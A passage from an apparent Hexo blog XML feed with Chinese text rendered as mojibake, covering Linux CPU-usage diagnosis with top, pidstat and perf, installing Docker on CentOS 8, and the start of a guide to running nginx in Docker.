ä½¿ç”¨ç‡ï¼Œæ€§èƒ½å·¥å…·ä¸€èˆ¬éƒ½ä¼šå–é—´éš”ä¸€æ®µæ—¶é—´ï¼ˆæ¯”å¦‚ 3 ç§’ï¼‰çš„ä¸¤æ¬¡å€¼ï¼Œä½œå·®åï¼Œå†è®¡ç®—å‡ºè¿™æ®µæ—¶é—´å†…çš„å¹³å‡ CPU ä½¿ç”¨ç‡ï¼Œå³<br><img src="https://snowgo.top/medias/medias/CPU%E4%BD%BF%E7%94%A8%E7%8E%87%E4%BB%A5%E5%8F%8A%E5%BC%82%E5%B8%B8%E6%8E%92%E6%9F%A5%E7%AD%96%E7%95%A5/1.png"><br>è¿™ä¸ªå…¬å¼ï¼Œå°±æ˜¯æˆ‘ä»¬ç”¨å„ç§æ€§èƒ½å·¥å…·æ‰€çœ‹åˆ°çš„ CPU ä½¿ç”¨ç‡çš„å®é™…è®¡ç®—æ–¹æ³•ã€‚<br>è¿˜æ˜¯ç”¨å·¥å…·æŸ¥çœ‹æ›´æ–¹ä¾¿ä¸€ç‚¹ã€‚<br>ä¸è¿‡è¦æ³¨æ„çš„æ˜¯ï¼Œ<strong>æ€§èƒ½åˆ†æå·¥å…·ç»™å‡ºçš„éƒ½æ˜¯é—´éš”ä¸€æ®µæ—¶é—´çš„å¹³å‡ CPU ä½¿ç”¨ç‡ï¼Œæ‰€ä»¥è¦æ³¨æ„é—´éš”æ—¶é—´çš„è®¾ç½®</strong>ï¼Œç‰¹åˆ«æ˜¯ç”¨å¤šä¸ªå·¥å…·å¯¹æ¯”åˆ†ææ—¶ï¼Œä½ ä¸€å®šè¦ä¿è¯å®ƒä»¬ç”¨çš„æ˜¯ç›¸åŒçš„é—´éš”æ—¶é—´ã€‚<br>æ¯”å¦‚ï¼Œå¯¹æ¯”ä¸€ä¸‹ top å’Œ ps è¿™ä¸¤ä¸ªå·¥å…·æŠ¥å‘Šçš„ CPU ä½¿ç”¨ç‡ï¼Œé»˜è®¤çš„ç»“æœå¾ˆå¯èƒ½ä¸ä¸€æ ·ï¼Œå› ä¸º top é»˜è®¤ä½¿ç”¨ 3 ç§’æ—¶é—´é—´éš”ï¼Œè€Œ ps ä½¿ç”¨çš„å´æ˜¯è¿›ç¨‹çš„æ•´ä¸ªç”Ÿå‘½å‘¨æœŸã€‚</p><h2 id="æ€ä¹ˆæŸ¥çœ‹CPUä½¿ç”¨ç‡"><a href="#æ€ä¹ˆæŸ¥çœ‹CPUä½¿ç”¨ç‡" class="headerlink" title="æ€ä¹ˆæŸ¥çœ‹CPUä½¿ç”¨ç‡"></a>æ€ä¹ˆæŸ¥çœ‹CPUä½¿ç”¨ç‡</h2><ul><li><p>top</p><ul><li><p>æ˜¾ç¤ºäº†ç³»ç»Ÿæ€»ä½“çš„CPUå’Œå†…å­˜ä½¿ç”¨æƒ…å†µï¼Œä»¥åŠå„ä¸ªè¿›ç¨‹çš„èµ„æºä½¿ç”¨æƒ…å†µ</p></li><li><p>éœ€è¦å…³æ³¨çš„å†…å®¹</p><ul><li>usï¼šç”¨æˆ·æ€CPUæ—¶é—´</li><li>syï¼šå†…æ ¸æ€CPUæ—¶é—´</li><li>niï¼šä½ä¼˜å…ˆçº§ç”¨æˆ·æ€CPUæ—¶é—´</li><li>idï¼šç©ºé—²æ—¶é—´</li><li>waï¼šç­‰å¾…I/Oçš„CPUæ—¶é—´</li><li>hiï¼šå¤„ç†ç¡¬ä¸­æ–­çš„CPUæ—¶é—´</li><li>siï¼šå¤„ç†è½¯ä¸­æ–­çš„CPUæ—¶é—´</li><li>stï¼šå½“ç³»ç»Ÿè¿è¡Œåœ¨è™šæ‹Ÿæœºä¸­çš„æ—¶å€™ï¼Œè¢«å…¶ä»–è™šæ‹Ÿæœºå ç”¨çš„CPUæ—¶é—´<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">top - <span class="number">12</span>:<span class="number">55</span>:<span class="number">59</span> up  <span class="number">4</span>:<span class="number">19</span>,  <span class="number">1</span> user,  load average: <span class="number">0.12</span>, <span class="number">0.09</span>, <span class="number">0.13</span></span><br><span class="line">Tasks: <span class="number">247</span> total,   <span class="number">1</span> running, <span class="number">246</span> sleeping,   <span class="number">0</span> stopped,   <span class="number">0</span> zombie</span><br><span class="line">%Cpu(s):  <span class="number">0.8</span> us,  <span class="number">0.3</span> sy,  <span class="number">0.0</span> ni, <span class="number">98.9</span> id,  <span class="number">0.0</span> wa,  <span class="number">0.0</span> hi,  <span class="number">0.0</span> si,  <span class="number">0.0</span> st</span><br><span class="line">MiB Mem :  <span class="number">15924.8</span> total,  <span class="number">11337.8</span> free,   <span class="number">2364.4</span> used,   <span class="number">2222.7</span> buff/cache</span><br><span class="line">MiB Swap:  <span class="number">20480.0</span> total,  <span class="number">20480.0</span> free,      <span class="number">0.0</span> used.  <span class="number">13129.7</span> avail Mem </span><br><span class="line">  PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND      </span><br><span class="line"> <span class="number">3375</span> root      <span class="number">20</span>   <span class="number">0</span>  <span class="number">448948</span> <span class="number">143308</span>  <span class="number">67488</span> S   <span class="number">4.7</span>   <span class="number">0.9</span>   <span class="number">3</span>:<span class="number">03.23</span> Xorg                  </span><br><span class="line"> <span class="number">5034</span> gugoole   <span class="number">20</span>   <span class="number">0</span> <span class="number">1113836</span> <span class="number">301848</span>  <span class="number">83808</span> S   <span class="number">2.0</span>   <span class="number">1.9</span>   <span class="number">1</span>:<span class="number">36.60</span> deepin-wm             </span><br><span class="line"><span class="number">12563</span> gugoole   <span class="number">20</span>   <span class="number">0</span>  <span class="number">639916</span>  <span class="number">53484</span>  <span class="number">38248</span> S   <span class="number">2.0</span>   <span class="number">0.3</span>   <span class="number">0</span>:<span class="number">20.85</span> deepin-terminal       </span><br><span class="line"><span class="number">12897</span> gugoole   <span class="number">20</span>   <span class="number">0</span>  <span class="number">781592</span>  <span class="number">62376</span>  <span class="number">51520</span> S   <span class="number">0.7</span>   <span class="number">0.4</span>   <span class="number">0</span>:<span class="number">00.96</span> deepin-menu           </span><br><span class="line"> <span class="number">3546</span> root     <span class="number">-51</span>   <span class="number">0</span>       <span class="number">0</span>      <span class="number">0</span>      <span class="number">0</span> S   <span class="number">0.3</span>   <span class="number">0.0</span>   <span class="number">0</span>:<span class="number">25.21</span> irq/<span class="number">150</span>-nvidia        </span><br><span class="line"> <span class="number">5078</span> gugoole   <span class="number">20</span>   <span class="number">0</span> <span class="number">2929588</span>  <span class="number">60320</span>  <span class="number">40260</span> S   <span class="number">0.3</span>   <span class="number">0.4</span>   <span class="number">0</span>:<span class="number">13.14</span> dde-session-dae       </span><br><span class="line"> <span class="number">5105</span> gugoole   <span class="number">20</span>   <span class="number">0</span> <span class="number">1032992</span>  <span class="number">91004</span>  <span class="number">60048</span> S   <span class="number">0.3</span>   <span class="number">0.6</span>   <span class="number">0</span>:<span class="number">06.08</span> dde-dock              </span><br><span class="line"> <span class="number">5112</span> gugoole   <span class="number">20</span>   <span class="number">0</span> <span class="number">1191456</span>  <span class="number">84600</span>  <span class="number">69972</span> S   <span class="number">0.3</span>   <span class="number">0.5</span>   <span class="number">0</span>:<span class="number">38.45</span> dde-desktop           </span><br><span class="line"><span class="number">22085</span> root      <span class="number">20</span>   <span class="number">0</span>       <span class="number">0</span>      <span class="number">0</span>      <span class="number">0</span> I   <span class="number">0.3</span>   <span class="number">0.0</span>   <span class="number">0</span>:<span class="number">00.40</span> kworker/<span class="number">1</span>:<span class="number">0</span>           </span><br><span class="line"><span class="number">22485</span> gugoole   <span class="number">20</span>   <span class="number">0</span>  <span class="number">796232</span>  <span class="number">61444</span>  <span class="number">51036</span> S   <span class="number">0.3</span>   <span class="number">0.4</span>   <span class="number">0</span>:<span class="number">00.35</span> dde-osd               </span><br><span class="line">    <span class="number">1</span> root      <span class="number">20</span>   <span class="number">0</span>  <span class="number">225992</span>   <span class="number">9876</span>   <span class="number">6724</span> S   <span class="number">0.0</span>   <span class="number">0.1</span>   <span class="number">0</span>:<span class="number">02.27</span> systemd               </span><br><span class="line">    <span class="number">2</span> root      <span class="number">20</span>   <span class="number">0</span>       <span class="number">0</span>      <span class="number">0</span>      <span class="number">0</span> S   <span class="number">0.0</span>   <span class="number">0.0</span>   <span class="number">0</span>:<span class="number">00.01</span> kthreadd              </span><br><span class="line">    <span class="number">4</span> root       <span class="number">0</span> <span class="number">-20</span>       <span class="number">0</span>      <span class="number">0</span>      <span class="number">0</span> I   <span class="number">0.0</span>   <span class="number">0.0</span>   <span class="number">0</span>:<span class="number">00.00</span> kworker/<span class="number">0</span>:<span class="number">0</span>H          </span><br><span class="line">    <span class="number">6</span> root       <span class="number">0</span> <span class="number">-20</span>       <span class="number">0</span>      <span class="number">0</span>      <span class="number">0</span> I   <span class="number">0.0</span>   <span class="number">0.0</span>   <span class="number">0</span>:<span class="number">00.00</span> mm_percpu_wq          </span><br><span class="line">    <span class="number">7</span> root      <span class="number">20</span>   <span class="number">0</span>       <span class="number">0</span>      <span class="number">0</span>      <span class="number">0</span> S   <span class="number">0.0</span>   <span class="number">0.0</span>   <span class="number">0</span>:<span class="number">00.02</span> ksoftirqd/<span class="number">0</span>           </span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul></li></ul></li></ul><p><strong>top å¹¶æ²¡æœ‰ç»†åˆ†è¿›ç¨‹çš„ç”¨æˆ·æ€ CPU å’Œå†…æ ¸æ€ CPUã€‚</strong></p><ul><li><p>pidstat</p><ul><li><p>éœ€è¦å…³æ³¨çš„å†…å®¹</p><ul><li>%usrï¼šç”¨æˆ·æ€CPUä½¿ç”¨ç‡</li><li>%systemï¼šå†…æ ¸æ€CPUä½¿ç”¨ç‡</li><li>%guestï¼šè¿è¡Œè™šæ‹ŸæœºCPUä½¿ç”¨ç‡</li><li>%waitï¼šç­‰å¾…CPUä½¿ç”¨ç‡</li><li>%CPUï¼šæ€»çš„CPUä½¿ç”¨ç‡<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">âœ  ~ pidstat <span class="number">1</span> <span class="number">5</span></span><br><span class="line">Linux <span class="number">4.15</span><span class="number">.0</span><span class="number">-29</span>deepin-generic (gugoole-PC)  <span class="number">2018</span>å¹´<span class="number">11</span>æœˆ<span class="number">30</span>æ—¥     _x86_64_    (<span class="number">8</span> CPU)</span><br><span class="line"><span class="number">13</span>æ—¶<span class="number">36</span>åˆ†<span class="number">14</span>ç§’   UID       PID    %usr %system  %guest   %wait    %CPU   CPU  Command</span><br><span class="line"><span class="number">13</span>æ—¶<span class="number">36</span>åˆ†<span class="number">15</span>ç§’     <span class="number">0</span>         <span class="number">8</span>    <span class="number">0.00</span>    <span class="number">0.99</span>    <span class="number">0.00</span>    <span class="number">0.00</span>    <span class="number">0.99</span>     <span class="number">5</span>  rcu_sched</span><br><span class="line"><span class="number">13</span>æ—¶<span class="number">36</span>åˆ†<span class="number">15</span>ç§’     <span class="number">0</span>      <span class="number">3375</span>    <span class="number">1.98</span>    <span class="number">0.00</span>    <span class="number">0.00</span>    <span class="number">0.99</span>    <span class="number">1.98</span>     <span class="number">2</span>  Xorg</span><br><span class="line"><span class="number">13</span>æ—¶<span class="number">36</span>åˆ†<span class="number">15</span>ç§’     <span class="number">0</span>      <span class="number">3546</span>    <span class="number">0.00</span>    <span class="number">0.99</span>    <span class="number">0.00</span>    <span class="number">0.00</span>    <span class="number">0.99</span>     <span class="number">1</span>  irq/<span class="number">150</span>-nvidia</span><br><span class="line"><span class="number">13</span>æ—¶<span class="number">36</span>åˆ†<span class="number">15</span>ç§’  <span class="number">1000</span>      <span class="number">4861</span>    <span class="number">0.99</span>    <span class="number">0.00</span>    <span class="number">0.00</span>    <span class="number">0.00</span>    <span class="number">0.99</span>     <span class="number">2</span>  startdde</span><br><span class="line"><span class="number">13</span>æ—¶<span class="number">36</span>åˆ†<span class="number">15</span>ç§’  <span class="number">1000</span>      <span class="number">5034</span>    <span class="number">0.99</span>    <span class="number">0.00</span>    <span class="number">0.00</span>    <span class="number">0.00</span>    <span class="number">0.99</span>     <span class="number">7</span>  deepin-wm</span><br><span class="line"><span class="number">13</span>æ—¶<span class="number">36</span>åˆ†<span class="number">15</span>ç§’  <span class="number">1000</span>     <span class="number">12563</span>    <span class="number">0.99</span>    <span class="number">0.00</span>    <span class="number">0.00</span>    <span class="number">0.00</span>    <span class="number">0.99</span>     <span class="number">4</span>  deepin-terminal</span><br></pre></td></tr></table></figure><h2 id="CPUä½¿ç”¨ç‡è¿‡é«˜æ€ä¹ˆåŠï¼Ÿ"><a href="#CPUä½¿ç”¨ç‡è¿‡é«˜æ€ä¹ˆåŠï¼Ÿ" class="headerlink" title="CPUä½¿ç”¨ç‡è¿‡é«˜æ€ä¹ˆåŠï¼Ÿ"></a>CPUä½¿ç”¨ç‡è¿‡é«˜æ€ä¹ˆåŠï¼Ÿ</h2></li></ul></li></ul></li><li><p>perf topé‡‡æ ·</p><ul><li><p>éœ€è¦å…³æ³¨çš„å†…å®¹</p><ul><li><p>Samplesï¼šé‡‡æ ·æ•°</p></li><li><p>eventï¼šäº‹ä»¶ç±»å‹</p></li><li><p>Event countï¼šäº‹ä»¶æ€»æ•°é‡</p></li><li><p>Overheadï¼šæŒ‡è¯¥ç¬¦å·çš„æ€§èƒ½äº‹ä»¶åœ¨æ‰€æœ‰é‡‡ç”¨ä¸­çš„æ¯”ä¾‹</p></li><li><p>Sharedï¼šæŒ‡è¯¥å‡½æ•°æˆ–æŒ‡ä»¤æ‰€åœ¨çš„åŠ¨æ€å…±äº«å¯¹è±¡ï¼Œå¦‚ï¼šå†…æ ¸ã€è¿›ç¨‹åã€åŠ¨æ€é“¾æ¥åº“åç­‰</p></li><li><p>Objectï¼šåŠ¨æ€å…±äº«å¯¹è±¡çš„ç±»å‹</p><ul><li>[.]è¡¨ç¤ºç”¨æˆ·ç©ºé—´çš„å¯æ‰§è¡Œç¨‹åºã€æˆ–è€…åŠ¨æ€é“¾æ¥åº“</li><li>[k]è¡¨ç¤ºå†…æ ¸ç©ºé—´</li></ul></li><li><p>Symbolï¼šè¡¨ç¤ºç¬¦å·åï¼Œå³å‡½æ•°åï¼Œå½“å‡½æ•°æœªå‘½åæ—¶ç”¨16è¿›åˆ¶åœ°å€è¡¨ç¤º</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Samples: <span class="number">2</span>K of event <span class="string">&#x27;cycles:ppp&#x27;</span>, Event count (approx.): <span class="number">1330995812</span></span><br><span class="line">Overhead  Shared Object                       Symbol</span><br><span class="line">   <span class="number">9.20</span>%  [kernel]                            [k] module_get_kallsym</span><br><span class="line">   <span class="number">3.96</span>%  [kernel]                            [k] vsnprintf</span><br><span class="line">   <span class="number">2.73</span>%  [kernel]                            [k] format_decode</span><br><span class="line">   <span class="number">2.73</span>%  perf                                [.] <span class="number">0x00000000001ea373</span></span><br><span class="line">   <span class="number">1.89</span>%  [kernel]                            [k] number</span><br><span class="line">   <span class="number">1.88</span>%  [kernel]                            [k] kallsyms_expand_symbol.constprop<span class="number">.1</span></span><br><span class="line">   <span class="number">1.69</span>%  perf                                [.] <span class="number">0x00000000001f6368</span></span><br><span class="line">   <span class="number">1.69</span>%  [kernel]                            [k] memcpy_erms</span><br><span class="line">   <span class="number">1.43</span>%  perf                                [.] <span class="number">0x00000000001f77d0</span></span><br><span class="line">   <span class="number">1.34</span>%  libc<span class="number">-2.27</span>.so                        [.] __libc_calloc</span><br><span class="line">   <span class="number">1.24</span>%  [kernel]                            [k] <span class="keyword">string</span></span><br></pre></td></tr></table></figure></li></ul></li></ul></li><li><p>perf record</p><ul><li>ç¦»çº¿ä¿å­˜ç³»ç»Ÿçš„æ€§èƒ½ä¿¡æ¯ï¼ŒæŒ‰Ctrl+Cç»ˆæ­¢é‡‡æ ·</li></ul></li><li><p>perf report</p><ul><li>è§£æperf recordä¿å­˜çš„é‡‡æ ·ä¿¡æ¯<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#perf top</span><br><span class="line">Samples: <span class="number">3</span>K of event <span class="string">&#x27;cycles:ppp&#x27;</span>, Event count (approx.): <span class="number">1778811422</span></span><br><span class="line">Overhead  Command          Shared Object                  Symbol                            </span><br><span class="line">  <span class="number">28.61</span>%  swapper          [kernel.kallsyms]              [k] intel_idle                    </span><br><span class="line">   <span class="number">4.44</span>%  Xorg             [kernel.kallsyms]              [k] pci_conf1_read                </span><br><span class="line">   <span class="number">2.35</span>%  kworker/<span class="number">1</span>:<span class="number">2</span>      [kernel.kallsyms]              [k] _nv029827rm                   </span><br><span class="line">   <span class="number">2.05</span>%  Xorg             [kernel.kallsyms]              [k] _nv029827rm                   </span><br><span class="line">   <span class="number">1.76</span>%  deepin-wm        [kernel.kallsyms]              [k] pci_conf1_read                </span><br><span class="line">   <span class="number">1.61</span>%  deepin-wm        [kernel.kallsyms]              [k] _nv029827rm                   </span><br><span class="line">   <span class="number">1.09</span>%  irq/<span class="number">150</span>-nvidia   [kernel.kallsyms]              [k] _nv029827rm                   </span><br><span class="line">   <span class="number">1.08</span>%  deepin-wm        [kernel.kallsyms]              [k] syscall_return_via_sysret     </span><br><span class="line">   <span class="number">0.91</span>%  swapper          [unknown]                      [k] <span class="number">0000000000000000</span>              </span><br><span class="line">   <span class="number">0.71</span>%  Xorg             [kernel.kallsyms]              [k] _nv018294rm                   </span><br><span class="line">   <span class="number">0.41</span>%  swapper          [kernel.kallsyms]              [k] update_load_avg               </span><br><span class="line">   <span class="number">0.33</span>%  Xorg             [vdso]                         [.] <span class="number">0x0000000000000977</span> </span><br></pre></td></tr></table></figure></li></ul></li><li><p>ä¸€èˆ¬ä½¿ç”¨çš„æ—¶å€™ä¼šåŠ ä¸Š-gå‚æ•°ä»¥å¼€å¯è°ƒç”¨å…³ç³»çš„é‡‡æ ·</p><h2 id="demoï¼š"><a href="#demoï¼š" class="headerlink" title="demoï¼š"></a>demoï¼š</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># -g å¼€å¯è°ƒç”¨å…³ç³»åˆ†æï¼Œ-p æŒ‡å®š php-fpm çš„è¿›ç¨‹å· <span class="number">21515</span></span><br><span class="line">$ perf top -g -p <span class="number">21515</span></span><br></pre></td></tr></table></figure><p>æŒ‰æ–¹å‘é”®åˆ‡æ¢åˆ° php-fpmï¼Œå†æŒ‰ä¸‹å›è½¦é”®å±•å¼€ php-fpm çš„è°ƒç”¨å…³ç³»ï¼Œå‘ç°è°ƒç”¨å…³ç³»æœ€ç»ˆåˆ°äº† sqrt å’Œ add_functionã€‚çœ‹æ¥ï¼Œæˆ‘ä»¬éœ€è¦ä»è¿™ä¸¤ä¸ªå‡½æ•°å…¥æ‰‹äº†ã€‚<br><img src="https://snowgo.top/medias/medias/CPU%E4%BD%BF%E7%94%A8%E7%8E%87%E4%BB%A5%E5%8F%8A%E5%BC%82%E5%B8%B8%E6%8E%92%E6%9F%A5%E7%AD%96%E7%95%A5/2.png"><br>ä¹‹åå»æ£€æŸ¥å‡½æ•°æºç å°±è¡Œäº†ã€‚</p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2></li></ul><ul><li>usä¸nié«˜è¯´æ˜ç”¨æˆ·æ€è¿›ç¨‹å ç”¨è¾ƒå¤šçš„CPUï¼Œæ‰€ä»¥åº”è¯¥ç€é‡æ’æŸ¥è¿›ç¨‹çš„æ€§èƒ½é—®é¢˜</li><li>syé«˜è¯´æ˜å†…æ ¸æ€å ç”¨è¾ƒå¤šçš„CPUï¼Œæ‰€ä»¥åº”è¯¥ç€é‡æ’æŸ¥å†…æ ¸çº¿ç¨‹æˆ–è€…ç³»ç»Ÿè°ƒç”¨çš„æ€§èƒ½é—®é¢˜</li><li>waé«˜è¯´æ˜ç­‰å¾…I/Oçš„æ—¶é—´æ¯”è¾ƒé•¿ï¼Œæ‰€ä»¥åº”è¯¥ç€é‡æ’æŸ¥ç³»ç»Ÿå­˜å‚¨æ˜¯ä¸æ˜¯å‡ºç°äº†I/Oé—®é¢˜</li><li>hiå’Œsié«˜è¯´æ˜ç¡¬ä¸­æ–­ æˆ–è€…è½¯ä¸­æ–­çš„å¤„ç†ç¨‹åºå ç”¨äº†è¾ƒå¤šCPUï¼Œåº”è¯¥ç€é‡æ’æŸ¥å†…æ ¸ä¸­çš„ä¸­æ–­æœåŠ¡ç¨‹åº</li></ul>]]></content>
      
      
      <categories>
          
          <category> é—®é¢˜å’ŒæŠ€å·§ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CentOS8å®‰è£…Dockeræ­¥éª¤</title>
      <link href="/2022/06/22/CentOS8%E5%AE%89%E8%A3%85Docker%E6%AD%A5%E9%AA%A4/"/>
      <url>/2022/06/22/CentOS8%E5%AE%89%E8%A3%85Docker%E6%AD%A5%E9%AA%A4/</url>
      
        <content type="html"><![CDATA[<h2 id="CentOS8å®‰è£…Dockeræ­¥éª¤"><a href="#CentOS8å®‰è£…Dockeræ­¥éª¤" class="headerlink" title="CentOS8å®‰è£…Dockeræ­¥éª¤"></a>CentOS8å®‰è£…Dockeræ­¥éª¤</h2><h3 id="éªŒè¯Linuxå†…æ ¸ï¼ŒDocker-è¦æ±‚-CentOS-ç³»ç»Ÿçš„å†…æ ¸ç‰ˆæœ¬é«˜äº-3-10"><a href="#éªŒè¯Linuxå†…æ ¸ï¼ŒDocker-è¦æ±‚-CentOS-ç³»ç»Ÿçš„å†…æ ¸ç‰ˆæœ¬é«˜äº-3-10" class="headerlink" title="éªŒè¯Linuxå†…æ ¸ï¼ŒDocker è¦æ±‚ CentOS ç³»ç»Ÿçš„å†…æ ¸ç‰ˆæœ¬é«˜äº 3.10"></a>éªŒè¯Linuxå†…æ ¸ï¼ŒDocker è¦æ±‚ <strong>CentOS</strong> ç³»ç»Ÿçš„å†…æ ¸ç‰ˆæœ¬é«˜äº <strong>3.10</strong></h3><p>uname -r<br><img src="https://snowgo.top/medias/medias/CentOS8%E5%AE%89%E8%A3%85Docker%E6%AD%A5%E9%AA%A4/0.png"></p><h3 id="æ›´æ–°yum"><a href="#æ›´æ–°yum" class="headerlink" title="æ›´æ–°yum"></a>æ›´æ–°yum</h3><p>sudo yum update </p><h3 id="å®‰è£…yuméœ€è¦çš„å·¥å…·"><a href="#å®‰è£…yuméœ€è¦çš„å·¥å…·" class="headerlink" title="å®‰è£…yuméœ€è¦çš„å·¥å…·"></a>å®‰è£…yuméœ€è¦çš„å·¥å…·</h3><p>sudo yum install -y yum-utils device-mapper-persistent-data lvm2 1</p><h3 id="è®¾ç½®yumæºä¸ºé˜¿é‡Œé•œåƒ"><a href="#è®¾ç½®yumæºä¸ºé˜¿é‡Œé•œåƒ" class="headerlink" title="è®¾ç½®yumæºä¸ºé˜¿é‡Œé•œåƒ"></a>è®¾ç½®yumæºä¸ºé˜¿é‡Œé•œåƒ</h3><p>sudo yum-config-manager â€“add-repo <a href="http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo">http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</a><br><img src="https://snowgo.top/medias/medias/CentOS8%E5%AE%89%E8%A3%85Docker%E6%AD%A5%E9%AA%A4/1.png"></p><h3 id="å®‰è£…Docker"><a href="#å®‰è£…Docker" class="headerlink" title="å®‰è£…Docker"></a>å®‰è£…Docker</h3><p>CentOS8é»˜è®¤ä½¿ç”¨podmanä»£æ›¿dockerã€‚ç›´æ¥å®‰è£…dockerä¼šå‡ºç°ä»¥ä¸‹é”™è¯¯ã€‚<br><img src="https://snowgo.top/medias/medias/CentOS8%E5%AE%89%E8%A3%85Docker%E6%AD%A5%E9%AA%A4/2.png"><br>è§£å†³åŠæ³•ï¼Œå‘½ä»¤åè¿½åŠ  â€“allowerasing<br>sudo yum install docker-ce docker-ce-cli containerd.io â€“allowerasing<br>æˆ–è€…å…ˆå¸è½½podmanï¼Œç„¶ååœ¨å®‰è£…docker<br>/** ä¸‹è½½podemanå‘½ä»¤ <strong>/ yum erase podman buildah /</strong> å®‰è£…dockerå‘½ä»¤ <strong>/ sudo yum install docker-ce docker-ce-cli containerd.io<br>å®‰è£…æŒ‡å®šç‰ˆæœ¬çš„docker<br>/</strong>  æŸ¥çœ‹docker-ce-cliç‰ˆæœ¬ <strong>/ yum list docker-ce-cli â€“showduplicates|sort -r<br><img src="https://snowgo.top/medias/medias/CentOS8%E5%AE%89%E8%A3%85Docker%E6%AD%A5%E9%AA%A4/3.png"><br>/</strong>  å®‰è£…æŒ‡å®šç‰ˆæœ¬çš„docker **/  sudo yum install -y docker-ce-19.03.13 docker-ce-cli-19.03.13 containerd.io </p><h3 id="å¯åŠ¨å¹¶è®¾ç½®å¼€æœºè‡ªå¯åŠ¨"><a href="#å¯åŠ¨å¹¶è®¾ç½®å¼€æœºè‡ªå¯åŠ¨" class="headerlink" title="å¯åŠ¨å¹¶è®¾ç½®å¼€æœºè‡ªå¯åŠ¨"></a>å¯åŠ¨å¹¶è®¾ç½®å¼€æœºè‡ªå¯åŠ¨</h3><p>systemctl start docker systemctl enable docker </p><h3 id="æµ‹è¯•æ˜¯å¦æˆåŠŸ"><a href="#æµ‹è¯•æ˜¯å¦æˆåŠŸ" class="headerlink" title="æµ‹è¯•æ˜¯å¦æˆåŠŸ"></a>æµ‹è¯•æ˜¯å¦æˆåŠŸ</h3><p>docker version</p>]]></content>
      
      
      <categories>
          
          <category> é—®é¢˜å’ŒæŠ€å·§ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dockeréƒ¨ç½²nginx</title>
      <link href="/2022/06/22/Docker%E9%83%A8%E7%BD%B2nginx/"/>
      <url>/2022/06/22/Docker%E9%83%A8%E7%BD%B2nginx/</url>
      
        <content type="html"><![CDATA[<h3 id="ä¸‹è½½Nginxé•œåƒ"><a href="#ä¸‹è½½Nginxé•œåƒ" class="headerlink" title="ä¸‹è½½Nginxé•œåƒ"></a>ä¸‹è½½Nginxé•œåƒ</h3><table><thead><tr><th><strong>å‘½ä»¤</strong></th><th><strong>æè¿°</strong></th></tr></thead><tbody><tr><td>docker pull nginx</td><td>ä¸‹è½½æœ€æ–°ç‰ˆNginxé•œåƒ (å…¶å®æ­¤å‘½ä»¤å°±ç­‰åŒäº : docker pull nginx:latest )</td></tr><tr><td>docker pull nginx:xxx</td><td>ä¸‹è½½æŒ‡å®šç‰ˆæœ¬çš„Nginxé•œåƒ (xxxæŒ‡å…·ä½“ç‰ˆæœ¬å·)</td></tr></tbody></table><p><img src="https://snowgo.top/medias/medias/Docker%E9%83%A8%E7%BD%B2nginx/0.png"><br>æ£€æŸ¥å½“å‰æ‰€æœ‰<a href="https://so.csdn.net/so/search?q=Docker&spm=1001.2101.3001.7020">Docker</a>ä¸‹è½½çš„é•œåƒ<br>docker images </p><h3 id="åˆ›å»ºNginxé…ç½®æ–‡ä»¶"><a href="#åˆ›å»ºNginxé…ç½®æ–‡ä»¶" class="headerlink" title="åˆ›å»ºNginxé…ç½®æ–‡ä»¶"></a>åˆ›å»ºNginxé…ç½®æ–‡ä»¶</h3><p>å¯åŠ¨å‰éœ€è¦å…ˆåˆ›å»ºNginxå¤–éƒ¨æŒ‚è½½çš„é…ç½®æ–‡ä»¶ï¼ˆ /home/nginx/conf/nginx.confï¼‰<br>ä¹‹æ‰€ä»¥è¦å…ˆåˆ›å»º , æ˜¯å› ä¸ºNginxæœ¬èº«å®¹å™¨åªå­˜åœ¨/etc/nginx ç›®å½• , æœ¬èº«å°±ä¸åˆ›å»º nginx.conf æ–‡ä»¶<br>å½“æœåŠ¡å™¨å’Œå®¹å™¨éƒ½ä¸å­˜åœ¨ nginx.conf æ–‡ä»¶æ—¶, æ‰§è¡Œå¯åŠ¨å‘½ä»¤çš„æ—¶å€™ dockerä¼šå°†nginx.conf ä½œä¸ºç›®å½•åˆ›å»º , è¿™å¹¶ä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„ç»“æœ ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 